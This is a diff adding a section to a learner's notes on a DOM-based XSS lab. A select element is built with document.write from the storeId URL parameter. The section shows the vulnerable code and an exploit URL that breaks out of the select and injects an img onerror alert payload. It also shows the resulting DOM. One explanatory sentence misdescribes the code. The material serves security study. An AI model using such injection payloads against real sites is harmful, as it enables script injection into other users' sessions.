@@ -177,3 +177,62 @@ In some case, we can deliver a simiilar payload using **"iframe"**:
 ```
 
 This code load the vulnerable page inside a box (the iframe) and then append to the URL in the src field the hashchange value which exploits the vulnerability.
+
+# DOM XSS in document.write sink using source location.search inside a select element
+
+### Scenario
+
+We have a **shop page** with different products. If we scroll down, after entering one product page, we notice that there is a dropdown box with different location which represents different stocks.
+
+```html
+<select name="storeId">
+    <option>London</option>
+    <option>Paris</option>
+    <option>Milan</option>
+</select>
+```
+Above that select element there is a JS script:
+
+```javascript
+var stores = ["London","Paris","Milan"];
+var store = (new URLSearchParams(window.location.search)).get('storeId');
+document.write('<select name="storeId">');
+if(store) {
+    document.write('<option selected>'+store+'</option>');
+}
+for(var i=0;i<stores.length;i++) {
+    if(stores[i] === store) {
+        continue;
+    }
+    document.write('<option>'+stores[i]+'</option>');
+}
+document.write('</select>');
+```
+
+In this code, an array is created and assign to a variable. The array has three elements.
+Another variable take the value contained inside the URL parameter "storeId".
+If a value is passed and the value passed is not already in the array, the JS created it and append it to the array.
+
+### Exploit
+We can add a URL parameter like this:
+```
+URL/productId="1"&storeId=test</select>
+```
+
+The select will break the DOM.
+
+Complete exploit:
+```
+URL/productId="1"&storeId=test</select><img src="1" onerror="alert()">
+```
+
+The resulting DOM after the exploit is:
+```html
+<select name="storeId">
+    <option selected="">test</option>
+</select>
+<img src="1" onerror="alert()">
+<option>London</option>
+<option>Paris</option>
+<option>Milan</option>
+```
